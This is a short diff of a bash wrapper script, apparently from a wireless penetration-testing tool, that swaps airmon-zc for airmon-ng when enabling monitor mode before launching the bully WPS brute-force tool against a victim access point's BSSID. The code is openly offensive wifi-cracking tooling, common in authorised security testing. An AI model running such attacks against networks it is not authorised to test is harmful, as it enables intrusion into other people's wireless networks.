@@ -42,7 +42,7 @@ do_it()
 {
     if [[ -z $(ip addr | grep -i "$MON") ]]; then
         iwconfig $IFACE1 mode managed # Force managed mode upon wlan because airmon wont do this
-        [[ -z $(ip addr | grep -i "${MON}") ]] && airmon-zc start $IFACE1
+        [[ -z $(ip addr | grep -i "${MON}") ]] && airmon-ng start $IFACE1
     fi
     xterm -hold -bg black -fg blue -T "Bully" -geometry 90x20 -e bully -b $VICTIM_BSSID -c $CHAN -B $MON &>/dev/null &
     keepalive
@@ -57,7 +57,7 @@ keepalive()
 
 killAll()
 {
-    airmon-zc stop $MON
+    airmon-ng stop $MON
     echo "${BLD_TEA}$(cat ${DIR_LOGO}/die.logo)${TXT_RST}"
     sleep 2
     exit 0
